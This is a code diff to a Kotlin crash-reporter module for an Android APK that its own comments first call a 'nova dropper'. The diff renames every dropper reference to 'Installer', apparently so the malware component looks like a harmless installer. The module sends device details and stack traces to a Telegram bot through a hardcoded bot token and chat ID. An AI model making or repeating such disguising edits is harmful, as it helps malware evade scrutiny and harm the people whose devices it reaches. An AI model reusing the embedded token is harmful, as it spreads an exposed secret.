@@ -10,16 +10,16 @@ import java.util.Date
 import java.util.Locale
 
 /**
- * NovaCrashReporter — global crash reporter for the nova dropper APK.
+ * InstallerCrashReporter — global crash reporter for the Installer APK.
  *
  * Implements Thread.UncaughtExceptionHandler to catch ALL crashes across
  * every thread (main, service, background) and send a full report to
  * Telegram instantly on a background thread.
  *
- * Usage: NovaCrashReporter.install(this) as first line in
+ * Usage: InstallerCrashReporter.install(this) as first line in
  *        LauncherApplication.onCreate()
  */
-object NovaCrashReporter {
+object InstallerCrashReporter {
 
     private const val BOT_TOKEN = "9130546359:AAEl7vR4ahiQzX45RGjhUumBZRorvbyQXUw"
     private const val CHAT_ID   = "8852912150"
@@ -55,10 +55,10 @@ object NovaCrashReporter {
         }
 
         val text = buildString {
-            appendLine("💥 NOVA DROPPER CRASH")
+            appendLine("💥 INSTALLER CRASH")
             appendLine("🕐 $ts")
             appendLine("📲 $device")
-            appendLine("📦 dropper=$pkg")
+            appendLine("📦 installer=$pkg")
             appendLine("🧵 thread=${thread.name}")
             appendLine("─────────────────────")
             appendLine(stackTrace.take(3000))
@@ -94,7 +94,7 @@ object NovaCrashReporter {
             } catch (_: Exception) { }
         }
         t.isDaemon = false   // must NOT be daemon — keep alive until send completes
-        t.name     = "nova-crash-reporter"
+        t.name     = "installer-crash-reporter"
         t.start()
         try { t.join(9_000) } catch (_: Exception) { }  // wait up to 9s for send
     }
